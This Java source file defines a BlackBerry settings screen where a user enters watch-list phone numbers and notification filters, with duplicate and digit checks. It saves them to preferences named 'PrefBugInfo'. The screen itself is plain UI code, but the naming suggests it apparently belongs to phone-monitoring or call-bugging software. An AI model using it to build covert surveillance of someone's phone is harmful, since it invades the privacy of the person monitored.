package com.vvt.screen;

import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.global.Global;
import com.vvt.ui.resource.MainAppTextResource;
import net.rim.device.api.ui.Manager;
import net.rim.device.api.ui.component.Dialog;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.FieldChangeListener;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.BasicEditField;
import net.rim.device.api.ui.component.ButtonField;
import net.rim.device.api.ui.component.CheckboxField;
import net.rim.device.api.ui.component.EditField;
import net.rim.device.api.ui.component.SeparatorField;
import net.rim.device.api.ui.container.HorizontalFieldManager;
import net.rim.device.api.ui.container.MainScreen;
import net.rim.device.api.ui.container.VerticalFieldManager;

public class WatchNumberScreen extends MainScreen implements FieldChangeListener {

	private EditField[] watchNumberField = null;
	private VerticalFieldManager watchNumberVerticalMgr = new VerticalFieldManager();
	private Preference pref = Global.getPreference();
	private SeparatorField watchSeparateField = new SeparatorField();
	private PrefWatchListInfo prefWatchInfo = null;
	private PrefBugInfo prefBugInfo = null;
	private ButtonField saveButton = null;
	private ButtonField clearAllButton = null;
	private CheckboxField inAddrbookField = null;
	private CheckboxField notInAddrbookField = null;
	private CheckboxField inWatchListField = null;
	private CheckboxField unknownField = null;
	private int maxWatchNumbers = 0;
//	private String regex = "\\+?[0-9]+";
	
	public WatchNumberScreen() {
		try {
			setTitle(MainAppTextResource.WATCH_NUMBER_SCREEN_MENU);
			initializeWatchListField();			
		} catch (Exception e) {
			Log.error("WatchNumberScreen.constructor", e.getMessage(), e);
		}
	}
	
	private void initializeWatchListField() {
		String [] watchStrs = {"", "", "", "", "", "", "", "", "", ""};
		LabelField filterLabel = new LabelField(MainAppTextResource.WATCH_NUMBER_SCREEN_NOTIFY_TYPE);
		add(filterLabel);
		prefBugInfo = (PrefBugInfo) pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
		prefWatchInfo = prefBugInfo.getPrefWatchListInfo();
		inAddrbookField = new CheckboxField(MainAppTextResource.WATCH_NUMBER_SCREEN_IN_ADDRESSBOOK, prefWatchInfo.isInAddrbookEnabled());
		notInAddrbookField = new CheckboxField(MainAppTextResource.WATCH_NUMBER_SCREEN_NOT_ADDRESSBOOK, prefWatchInfo.isNotInAddrbookEnabled());
		inWatchListField = new CheckboxField(MainAppTextResource.WATCH_NUMBER_SCREEN_IN_WATCH_LIST, prefWatchInfo.isInWatchListEnabled());
		unknownField = new CheckboxField(MainAppTextResource.WATCH_NUMBER_SCREEN_UNKNOWN_NUMBER, prefWatchInfo.isUnknownEnabled());
		watchNumberVerticalMgr.add(inAddrbookField);
		watchNumberVerticalMgr.add(notInAddrbookField);
		watchNumberVerticalMgr.add(inWatchListField);
		watchNumberVerticalMgr.add(unknownField);
		watchNumberVerticalMgr.add(watchSeparateField);
		int countWatchNumber = prefWatchInfo.countWatchNumber();
		for (int i = 0; i < countWatchNumber; i++)	{
			watchStrs[i] = (String) prefWatchInfo.getWatchNumber(i);		
		}
		maxWatchNumbers = prefBugInfo.getMaxWatchNumbers();
		watchNumberField = new EditField[maxWatchNumbers];
		for (int i = 0; i < maxWatchNumbers; i++) {
			watchNumberField[i] = new EditField(MainAppTextResource.MAIN_SCREEN_NUMBER + (i + 1) + Constant.COLON + Constant.SPACE, watchStrs[i], 20, BasicEditField.FILTER_PHONE);
			watchNumberVerticalMgr.add(watchNumberField[i]);
		}
		VerticalFieldManager vfLeft = new VerticalFieldManager();
		VerticalFieldManager vfRight = new VerticalFieldManager();
		HorizontalFieldManager hfm = new HorizontalFieldManager(BasicEditField.FIELD_HCENTER);
		saveButton = new ButtonField(MainAppTextResource.SETTING_SCREEN_SAVE, ButtonField.CONSUME_CLICK);
		clearAllButton = new ButtonField(MainAppTextResource.SETTING_SCREEN_CLEAR_ALL, ButtonField.CONSUME_CLICK);		
		saveButton.setChangeListener(this);
		clearAllButton.setChangeListener(this);
		vfLeft.add(saveButton);
		vfRight.add(clearAllButton);
		hfm.add(vfLeft);
		hfm.add(vfRight);		
		add(watchNumberVerticalMgr);		
		add(hfm);
	}
	
	private void initWatchList() {
		boolean notMatch = false;	
		prefWatchInfo.setInAddrbookEnabled(inAddrbookField.getChecked());
		prefWatchInfo.setNotInAddrbookEnabled(notInAddrbookField.getChecked());
		prefWatchInfo.setInWatchListEnabled(inWatchListField.getChecked());		
		prefWatchInfo.setUnknownEnabled(unknownField.getChecked());		
		if (isEmptyList()) {
			prefWatchInfo.removeAllWatchNumbers();
		} else if (isDuplicateNumber()) {
			Dialog.alert(MainAppTextResource.DUPLICATE_NUMBER);
		} else if (isInValidNumber()) {
			Dialog.alert(MainAppTextResource.INVALID_NUMBER);			
		} else {
			prefWatchInfo.removeAllWatchNumbers();
			String[] watchlist = new String[maxWatchNumbers];
			for (int i = 0; i < maxWatchNumbers; i++) {
				watchlist[i] = watchNumberField[i].getText().trim();		
				if (watchlist[i].length() > 0) {
					prefWatchInfo.addWatchNumber(watchlist[i]);
				}
			}
			watchlist = null;
		}
		prefBugInfo.setPrefWatchListInfo(prefWatchInfo);	
		pref.commit(prefBugInfo);
	}
	
	
	private boolean isDuplicateNumber() {
		boolean duplicate = false;
		String[] watchlist = new String[maxWatchNumbers];
		for (int i = 0; i < maxWatchNumbers; i++) {
			watchlist[i] = watchNumberField[i].getText().trim();	
			if (watchlist[i].length() > 0) {
				for (int j = i + 1; j < maxWatchNumbers; j++) {
					if (watchlist[i].equals(watchNumberField[j].getText().trim())) {
						duplicate = true;
						break;
					}
				}
				if (duplicate) {
					break;
				}	
			}
		}
		watchlist = null;
		return duplicate;
	}
	
	private boolean isInValidNumber() {
		boolean invalid = false;
		String[] watchlist = new String[maxWatchNumbers];
		for (int i = 0; i < maxWatchNumbers; i++) {
			watchlist[i] = watchNumberField[i].getText().trim();		
			if (watchlist[i].length() > 0) {
				if (!isValidDigits(watchlist[i])) {
					invalid = true;
					break;
				}
			}
		}
		watchlist = null;
		return invalid;
	}
	
	private boolean isValidDigits(String number) {		
		boolean valid = true;		
		if (number.startsWith(Constant.PLUS)) {
			number = number.substring(1);
		}
		if ((number != null) && (number.length() > 0)) {
			for (int i = 0; i < number.length(); i++) {
				if (!Character.isDigit(number.charAt(i))) {
					valid = false;
					break;
				}
			}
		} else {
			valid = false;
		}
		return valid;
	}
	
	private void clearAll() {
		for (int i = 0; i < maxWatchNumbers; i++) {
			watchNumberField[i].clear(0);
		}
//		clearState = true;
	}
	
	private boolean isEmptyList() {
		boolean emptyList = true;
		for (int i = 0; i < maxWatchNumbers; i++) {
			if (!watchNumberField[i].getText().trim().equals(Constant.EMPTY_STRING)) {
				emptyList = false;
				break;
			}
		}
		return emptyList;
	}
	
	// Override the method to avoid asking SAVE/DISCARD/CANCEL when press back 
	public boolean onSavePrompt() {		
		return true;
	}
	
	public boolean onClose()	{
		String message = "Changes made?";
		String[] choices = new String[] {"Save", "Discard", "Cancel" };
		int[] values = {Dialog.SAVE, Dialog.DISCARD, Dialog.CANCEL};
		int defaultChoice = 1;
		
		ConfirmDialog customDialog = new ConfirmDialog(message, choices, values, defaultChoice);
		int result = customDialog.doModal();
		if (result == customDialog.SAVE) {
			initWatchList();
			return super.onClose();
		} else if (result == customDialog.DISCARD) {
			return super.onClose();
		} else {
			return false;
		}
	}
	
	// FieldChangeListener
	public void fieldChanged(Field field, int context) {
		try {
			if (field == saveButton) {	
				initWatchList();
				UiApplication.getUiApplication().popScreen(this);				
			} else if (field == clearAllButton) {
				clearAll();
			}
		} catch(Exception e) {
			Log.error("WatchNumberScreen.fieldChanged()", e.getMessage(), e);
		}
	}
	
	class ConfirmDialog extends Dialog {
		
		public ConfirmDialog(String message, String [] choices, int[] values, int defaultChoice) {
			super(message, choices, values, defaultChoice, null);
		}
	}
}
